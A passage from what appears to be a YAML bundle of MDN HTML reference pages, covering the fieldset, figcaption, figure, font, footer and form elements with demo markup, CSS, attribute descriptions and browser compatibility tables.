[`::slotted`](https://developer.mozilla.org/en-US/docs/Web/CSS/::slotted) pseudo-elements\n- [`:host`](https://developer.mozilla.org/en-US/docs/Web/CSS/:host) pseudo-class\n- [`ShadowRoot`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot) interface\n- [`Element.part`](https://developer.mozilla.org/en-US/docs/Web/API/Element/part) property\n- [Using templates and slots](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_templates_and_slots)\n- [CSS scoping](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_scoping) module\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/exportparts](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/exportparts)"
- name: fieldset
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<fieldset\\>: The Field Set element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ffieldset&level=high)\n\nThe `<fieldset>` [HTML](../index) element is used to group several controls as well as labels ([`<label>`](label)) within a web form.\n\n## Try it\n\n#### HTML Demo: \\<fieldset\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <form>\n      <fieldset>\n        <legend>Choose your favorite monster</legend>\n\n        <input type=\"radio\" id=\"kraken\" name=\"monster\" value=\"K\" />\n        <label for=\"kraken\">Kraken</label><br />\n\n        <input type=\"radio\" id=\"sasquatch\" name=\"monster\" value=\"S\" />\n        <label for=\"sasquatch\">Sasquatch</label><br />\n\n        <input type=\"radio\" id=\"mothman\" name=\"monster\" value=\"M\" />\n        <label for=\"mothman\">Mothman</label>\n      </fieldset>\n    </form>\n\n    legend {\n      background-color: #000;\n      color: #fff;\n      padding: 3px 6px;\n    }\n\n    input {\n      margin: 0.4rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nAs the example above shows, the `<fieldset>` element provides a grouping for a part of an HTML form, with a nested [`<legend>`](legend) element providing a caption for the `<fieldset>`. It takes few attributes, the most notable of which are `form`, which can contain the `id` of a [`<form>`](form) on the same page, allowing you to make the `<fieldset>` part of that `<form>` even if it is not nested inside it, and `disabled`, which allows you to disable the `<fieldset>` and all its contents in one go.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`disabled`](../attributes/disabled)  \nIf this Boolean attribute is set, all form controls that are descendants of the `<fieldset>`, are disabled, meaning they are not editable and won't be submitted along with the [`<form>`](form). They won't receive any browsing events, like mouse clicks or focus-related events. By default browsers display such controls grayed out. Note that form elements inside the [`<legend>`](legend) element won't be disabled.\n\n[`form`](#form)  \nThis attribute takes the value of the [`id`](../global_attributes#id) attribute of a [`<form>`](form) element you want the `<fieldset>` to be part of, even if it is not inside the form. Please note that usage of this is confusing — if you want the [`<input>`](input) elements inside the `<fieldset>` to be associated with the form, you need to use the `form` attribute directly on those elements. You can check which elements are associated with a form via JavaScript, using [`HTMLFormElement.elements`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements).\n\n[`name`](#name)  \nThe name associated with the group.\n\n**Note:** The caption for the fieldset is given by the first [`<legend>`](legend) element nested inside it.\n\n## Styling with CSS\n\nThere are several special styling considerations for `<fieldset>`.\n\nIts [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) value is `block` by default, and it establishes a [block formatting context](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_display/Block_formatting_context). If the `<fieldset>` is styled with an inline-level `display` value, it will behave as `inline-block`, otherwise it will behave as `block`. By default there is a `2px` `groove` border surrounding the contents, and a small amount of default padding. The element has [`min-inline-size: min-content`](https://developer.mozilla.org/en-US/docs/Web/CSS/min-inline-size) by default.\n\nIf a [`<legend>`](legend) is present, it is placed over the `block-start` border. The `<legend>` shrink-wraps, and also establishes a formatting context. The `display` value is blockified. (For example, `display: inline` behaves as `block`.)\n\nThere will be an anonymous box holding the contents of the `<fieldset>`, which inherits certain properties from the `<fieldset>`. If the `<fieldset>` is styled with `display: grid` or `display: inline-grid`, then the anonymous box will be a grid formatting context. If the `<fieldset>` is styled with `display: flex` or `display: inline-flex`, then the anonymous box will be a flex formatting context. Otherwise, it establishes a block formatting context.\n\nYou can feel free to style the `<fieldset>` and `<legend>` in any way you want to suit your page design.\n\n## Examples\n\n### Simple fieldset\n\nThis example shows a really simple `<fieldset>` example, with a `<legend>`, and a single control inside it.\n\nhtml\n\n```\n<form action=\"#\">\n  <fieldset>\n    <legend>Do you agree?</legend>\n    <input type=\"checkbox\" id=\"chbx\" name=\"agree\" value=\"Yes!\" />\n    <label for=\"chbx\">I agree</label>\n  </fieldset>\n</form>\n```\n\n#### Result\n\n### Disabled fieldset\n\nThis example shows a disabled `<fieldset>` with two controls inside it. Note how both the controls are disabled due to being inside a disabled `<fieldset>`.\n\nhtml\n\n```\n<form action=\"#\">\n  <fieldset disabled>\n    <legend>Disabled login fieldset</legend>\n    <div>\n      <label for=\"name\">Name: </label>\n      <input type=\"text\" id=\"name\" value=\"Chris\" />\n    </div>\n    <div>\n      <label for=\"pwd\">Archetype: </label>\n      <input type=\"password\" id=\"pwd\" value=\"Wookie\" />\n    </div>\n  </fieldset>\n</form>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                             |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [sectioning root](heading_elements#sectioning_root), [listed](../content_categories#form_listed), [form-associated](../content_categories#form-associated_content) element, palpable content.                                                           |\n| Permitted content                           | An optional [`<legend>`](legend) element, followed by flow content.                                                                                                                                                                                                                                         |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                                       |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                                                                                                                                                                                                                |\n| Implicit ARIA role                          | [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role)                                                                                                                                                                                                                 |\n| Permitted ARIA roles                        | [`radiogroup`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/radiogroup_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role) |\n| DOM interface                               | [`HTMLFieldSetElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFieldSetElement)                                                                                                                                                                                                               |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The [`<legend>`](legend) element\n- The [`<input>`](input) element\n- The [`<label>`](label) element\n- The [`<form>`](form) element\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/fieldset](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/fieldset)"
- name: figcaption
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<figcaption\\>: The Figure Caption element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ffigcaption&level=high)\n\nThe `<figcaption>` [HTML](../index) element represents a caption or legend describing the rest of the contents of its parent [`<figure>`](figure) element, providing the `<figure>` an [accessible description](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_description).\n\n## Try it\n\n#### HTML Demo: \\<figcaption\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <figure>\n      <img src=\"/media/cc0-images/elephant-660-480.jpg\" alt=\"Elephant at sunset\" />\n      <figcaption>An elephant at sunset</figcaption>\n    </figure>\n\n    figure {\n      border: thin #c0c0c0 solid;\n      display: flex;\n      flex-flow: column;\n      padding: 5px;\n      max-width: 220px;\n      margin: auto;\n    }\n\n    img {\n      max-width: 220px;\n      max-height: 150px;\n    }\n\n    figcaption {\n      background-color: #222;\n      color: #fff;\n      font: italic smaller sans-serif;\n      padding: 3px;\n      text-align: center;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Examples\n\nPlease see the [`<figure>`](figure) page for examples on `<figcaption>`.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                   |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                                                                                                                                                                             |\n| Permitted content                           | [Flow content](../content_categories#flow_content).                                                                                                                                                                                                                                               |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                             |\n| Permitted parents                           | A [`<figure>`](figure) element; the `<figcaption>` element must be its first or last child.                                                                                                                                                                                                       |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                                               |\n| Permitted ARIA roles                        | [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                                                                                                                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|              | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|              | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `figcaption` | 8       | 12   | 4       | 11    | 5.1    | 18             | 4                   | 11            | 5             | 1.0              | 4.4             |     |\n\n## See also\n\n- The [`<figure>`](figure) element.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/figcaption](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/figcaption)"
- name: figure
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<figure\\>: The Figure with Optional Caption element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ffigure&level=high)\n\nThe `<figure>` [HTML](../index) element represents self-contained content, potentially with an optional caption, which is specified using the [`<figcaption>`](figcaption) element. The figure, its caption, and its contents are referenced as a single unit.\n\n## Try it\n\n#### HTML Demo: \\<figure\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <figure>\n      <img src=\"/media/cc0-images/elephant-660-480.jpg\" alt=\"Elephant at sunset\" />\n      <figcaption>An elephant at sunset</figcaption>\n    </figure>\n\n    figure {\n      border: thin #c0c0c0 solid;\n      display: flex;\n      flex-flow: column;\n      padding: 5px;\n      max-width: 220px;\n      margin: auto;\n    }\n\n    img {\n      max-width: 220px;\n      max-height: 150px;\n    }\n\n    figcaption {\n      background-color: #222;\n      color: #fff;\n      font: italic smaller sans-serif;\n      padding: 3px;\n      text-align: center;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Usually a `<figure>` is an image, illustration, diagram, code snippet, etc., that is referenced in the main flow of a document, but that can be moved to another part of the document or to an appendix without affecting the main flow.\n- A caption can be associated with the `<figure>` element by inserting a [`<figcaption>`](figcaption) inside it (as the first or the last child). The first `<figcaption>` element found in the figure is presented as the figure's caption.\n- The `<figcaption>` provides the [accessible name](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_name) for the parent `<figure>`.\n\n## Examples\n\n### Images\n\nhtml\n\n```\n<!-- Just an image -->\n<figure>\n  <img src=\"favicon-192x192.png\" alt=\"The beautiful MDN logo.\" />\n</figure>\n\n<!-- Image with a caption -->\n<figure>\n  <img src=\"favicon-192x192.png\" alt=\"The beautiful MDN logo.\" />\n  <figcaption>MDN Logo</figcaption>\n</figure>\n```\n\n#### Result\n\n### Code snippets\n\nhtml\n\n```\n<figure>\n  <figcaption>Get browser details using <code>navigator</code>.</figcaption>\n  <pre>\nfunction NavigatorExample() {\n  var txt;\n  txt = \"Browser CodeName: \" + navigator.appCodeName + \"; \";\n  txt+= \"Browser Name: \" + navigator.appName + \"; \";\n  txt+= \"Browser Version: \" + navigator.appVersion  + \"; \";\n  txt+= \"Cookies Enabled: \" + navigator.cookieEnabled  + \"; \";\n  txt+= \"Platform: \" + navigator.platform  + \"; \";\n  txt+= \"User-agent header: \" + navigator.userAgent  + \"; \";\n  console.log(\"NavigatorExample\", txt);\n}\n  </pre>\n</figure>\n```\n\n#### Result\n\n### Quotations\n\nhtml\n\n```\n<figure>\n  <figcaption><b>Edsger Dijkstra:</b></figcaption>\n  <blockquote>\n    If debugging is the process of removing software bugs, then programming must\n    be the process of putting them in.\n  </blockquote>\n</figure>\n```\n\n#### Result\n\n### Poems\n\nhtml\n\n```\n<figure>\n  <p style=\"white-space:pre\">\n    Bid me discourse, I will enchant thine ear, Or like a fairy trip upon the\n    green, Or, like a nymph, with long dishevelled hair, Dance on the sands, and\n    yet no footing seen: Love is a spirit all compact of fire, Not gross to\n    sink, but light, and will aspire.\n  </p>\n  <figcaption><cite>Venus and Adonis</cite>, by William Shakespeare</figcaption>\n</figure>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                              |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [palpable content](../content_categories#palpable_content).                                                                              |\n| Permitted content                           | A [`<figcaption>`](figcaption) element, followed by [flow content](../content_categories#flow_content); or flow content followed by a [`<figcaption>`](figcaption) element; or flow content. |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                        |\n| Permitted parents                           | Any element that accepts [Flow content](../content_categories#flow_content).                                                                                                                 |\n| Implicit ARIA role                          | [figure](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/figure_role)                                                                                                  |\n| Permitted ARIA roles                        | With no [figcaption](figcaption) descendant: [any](https://www.w3.org/TR/html-aria/#dfn-any-role), otherwise no permitted roles                                                              |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                                                |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `figure` | 8       | 12   | 4       | 11    | 5.1    | 18             | 4                   | 11            | 5             | 1.0              | 4.4             |     |\n\n## See also\n\n- The [`<figcaption>`](figcaption) element.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/figure](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/figure)"
- name: font
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<font\\>\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<font>` [HTML](../index) element defines the font size, color and face for its content.\n\n**Warning:** Do not use this element. Use the CSS [Fonts](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_fonts) properties to style text.\n\n## Attributes\n\nLike all other HTML elements, this element supports the [global attributes](../global_attributes).\n\n[`color`](#color) Deprecated  \nThis attribute sets the text color using either a named color or a color specified in the hexadecimal \\#RRGGBB format.\n\n[`face`](#face) Deprecated  \nThis attribute contains a comma-separated list of one or more font names. The document text in the default style is rendered in the first font face that the client's browser supports. If no font listed is installed on the local system, the browser typically defaults to the proportional or fixed-width font for that system.\n\n[`size`](#size) Deprecated  \nThis attribute specifies the font size as either a numeric or relative value. Numeric values range from `1` to `7` with `1` being the smallest and `3` the default. It can be defined using a relative value, like `+2` or `-3`, which sets it relative to `3`, the default value.\n\n## DOM interface\n\nThis element implements the [`HTMLFontElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFontElement) interface.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `font`  | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `color` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `face`  | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `size`  | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/font](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/font)"
- name: footer
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<footer\\>: The Footer element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ffooter&level=high)\n\nThe `<footer>` [HTML](../index) element represents a footer for its nearest ancestor [sectioning content](../content_categories#sectioning_content) or [sectioning root](heading_elements#labeling_section_content) element. A `<footer>` typically contains information about the author of the section, copyright data or links to related documents.\n\n## Try it\n\n#### HTML Demo: \\<footer\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <article>\n      <h1>How to be a wizard</h1>\n      <ol>\n        <li>Grow a long, majestic beard.</li>\n        <li>Wear a tall, pointed hat.</li>\n        <li>Have I mentioned the beard?</li>\n      </ol>\n      <footer>\n        <p>© 2018 Gandalf</p>\n      </footer>\n    </article>\n\n    article {\n      min-height: 100%;\n      display: grid;\n      grid-template-rows: auto 1fr auto;\n    }\n\n    footer {\n      display: flex;\n      justify-content: center;\n      padding: 5px;\n      background-color: #45a1ff;\n      color: #fff;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Enclose information about the author in an [`<address>`](address) element that can be included into the `<footer>` element.\n- When the nearest ancestor sectioning content or sectioning root element is the body element the footer applies to the whole page.\n- The `<footer>` element is not sectioning content and therefore doesn't introduce a new section in the [outline](heading_elements).\n\n## Accessibility\n\nPrior to the release of Safari 13, the `contentinfo` [landmark role](https://developer.mozilla.org/en-US/docs/Learn/Accessibility/WAI-ARIA_basics#signpostslandmarks) was not properly exposed by [VoiceOver](https://help.apple.com/voiceover/info/guide/). If needing to support legacy Safari browsers, add `role=\"contentinfo\"` to the `footer` element to ensure the landmark will be properly exposed.\n\n- Related: [WebKit Bugzilla: 146930 – AX: HTML native elements (header, footer, main, aside, nav) should work the same as ARIA landmarks, sometimes they don't](https://webkit.org/b/146930)\n\n## Examples\n\nhtml\n\n```\n<body>\n  <h3>FIFA World Cup top goalscorers</h3>\n  <ol>\n    <li>Miroslav Klose, 16</li>\n    <li>Ronaldo Nazário, 15</li>\n    <li>Gerd Müller, 14</li>\n  </ol>\n\n  <footer>\n    <small>\n      Copyright © 2023 Football History Archives. All Rights Reserved.\n    </small>\n  </footer>\n</body>\n```\n\ncss\n\n```\nfooter {\n  text-align: center;\n  padding: 5px;\n  background-color: #abbaba;\n  color: #000;\n}\n```\n\n## Technical summary\n\n|                                             ||\n|---------------------------------------------||\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), palpable content|\n| Permitted content                           | [Flow content](../content_categories#flow_content), but with no `<footer>` or [`<header>`](header) descendants|\n| Tag omission                                | None, both the starting and ending tag are mandatory|\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content). Note that a `<footer>` element must not be a descendant of an [`<address>`](address), [`<header>`](header) or another `<footer>` element|\n| Implicit ARIA role                          | [contentinfo](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/contentinfo_role), or [generic](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role) if a descendant of an [article](article), [aside](aside), [main](main), [nav](nav) or [section](section) element, or an element with `role=`[`article`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/article_role), [`complementary`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/complementary_role), [`main`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/main_role), [`navigation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/navigation_role) or [`region`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/region_role) |\n| Permitted ARIA roles                        | [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) or [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role|\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement|\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `footer` | 5       | 12   | 4       | 11.1  | 5      | 18             | 4                   | 11.1          | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- Other section-related elements: [`<body>`](body), [`<nav>`](nav), [`<article>`](article), [`<aside>`](aside), [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), [h6](heading_elements), [`<hgroup>`](hgroup), [`<header>`](header), [`<section>`](section), [`<address>`](address);\n- [Using HTML sections and outlines](heading_elements)\n- [ARIA: Contentinfo role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/contentinfo_role)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/footer](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/footer)"
- name: for (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`for`](attributes/for)

    [`<label>`](element/label), [`<output>`](element/output)

    Describes elements which belongs to this one.
- name: form
  summary: The <form> HTML element represents a document section containing interactive controls for submitting information
  description: "# \\<form\\>: The Form element\n\nThe `<form>` [HTML](../index) element represents a document section containing interactive controls for submitting information.\n\n## Try it\n\n#### HTML Demo: \\<form\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <form action=\"\" method=\"get\" class=\"form-example\">\n      <div class=\"form-example\">\n        <label for=\"name\">Enter your name: </label>\n        <input type=\"text\" name=\"name\" id=\"name\" required />\n      </div>\n      <div class=\"form-example\">\n        <label for=\"email\">Enter your email: </label>\n        <input type=\"email\" name=\"email\" id=\"email\" required />\n      </div>\n      <div class=\"form-example\">\n        <input type=\"submit\" value=\"Subscribe!\" />\n      </div>\n    </form>\n\n    form.form-example {\n      display: table;\n    }\n\n    div.form-example {\n      display: table-row;\n    }\n\n    label,\n    input {\n      display: table-cell;\n      margin-bottom: 10px;\n    }\n\n    label {\n      padding-right: 10px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nIt is possible to use the [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) CSS [pseudo-classes](https://developer.mozilla.org/en-US/docs/Web/CSS/Pseudo-classes) to style a `<form>` element based on whether the [`elements`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements) inside the form are valid.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`accept`](#accept) Deprecated  \nComma-separated [content types](https://developer.mozilla.org/en-US/docs/Web/SVG/Content_type) the server accepts.\n\n**Note:** **This attribute has been deprecated and should not be used.** Instead, use the [`accept`](input#accept) attribute on `<input type=file>` elements.\n\n[`accept-charset`](#accept-charset)  \nSpace-separated [character encodings](https://developer.mozilla.org/en-US/docs/Glossary/Character_encoding) the server accepts. The browser uses them in the order in which they are listed. The default value means [the same encoding as the page](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Encoding). (In previous versions of HTML, character encodings could also be delimited by commas.)\n\n[`autocapitalize`](#autocapitalize)  \nControls whether inputted text is automatically capitalized and, if so, in what manner. See the [`autocapitalize`](../global_attributes/autocapitalize) global attribute page for more information.\n\n[`autocomplete`](../attributes/autocomplete)  \nIndicates whether input elements can by default have their values automatically completed by the browser. `autocomplete` attributes on form elements override it on `<form>`. Possible values:\n\n- `off`: The browser may not automatically complete entries. (Browsers tend to ignore this for suspected login forms; see [Managing autofill for login fields](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Turning_off_form_autocompletion#managing_autofill_for_login_fields).)\n- `on`: The browser may automatically complete entries.\n\n[`name`](#name)  \nThe name of the form. The value must not be the empty string, and must be unique among the `form` elements in the forms collection that it is in, if any.\n\n[`rel`](../attributes/rel)  \nControls the annotations and what kinds of links the form creates. Annotations include [`external`](../attributes/rel#external), [`nofollow`](../attributes/rel#nofollow), [`opener`](../attributes/rel#opener), [`noopener`](../attributes/rel#noopener), and [`noreferrer`](../attributes/rel#noreferrer). Link types include [`help`](../attributes/rel#help), [`prev`](../attributes/rel#prev), [`next`](../attributes/rel#next), [`search`](../attributes/rel#search), and [`license`](../attributes/rel#license). The [`rel`](../attributes/rel) value is a space-separated list of these enumerated values.\n\n### Attributes for form submission\n\nThe following attributes control behavior during form submission.\n\n[`action`](#action)  \nThe URL that processes the form submission. This value can be overridden by a [`formaction`](button#formaction) attribute on a [`<button>`](button), [`<input type=\"submit\">`](input/submit), or [`<input type=\"image\">`](input/image) element. This attribute is ignored when `method=\"dialog\"` is set.\n\n[`enctype`](#enctype)  \nIf the value of the `method` attribute is `post`, `enctype` is the [MIME type](https://en.wikipedia.org/wiki/Mime_type) of the form submission. Possible values:\n\n- `application/x-www-form-urlencoded`: The default value.\n- `multipart/form-data`: Use this if the form contains [`<input>`](input) elements with `type=file`.\n- `text/plain`: Useful for debugging purposes.\n\nThis value can be overridden by [`formenctype`](button#formenctype) attributes on [`<button>`](button), [`<input type=\"submit\">`](input/submit), or [`<input type=\"image\">`](input/image) elements.\n\n[`method`](#method)  \nThe [HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP) method to submit the form with. The only allowed methods/values are (case insensitive):\n\n- `post`: The [`POST`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST) method; form data sent as the [request body](https://developer.mozilla.org/en-US/docs/Web/API/Request/body).\n- `get` (default): The [`GET`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET); form data appended to the `action` URL with a `?` separator. Use this method when the form [has no side 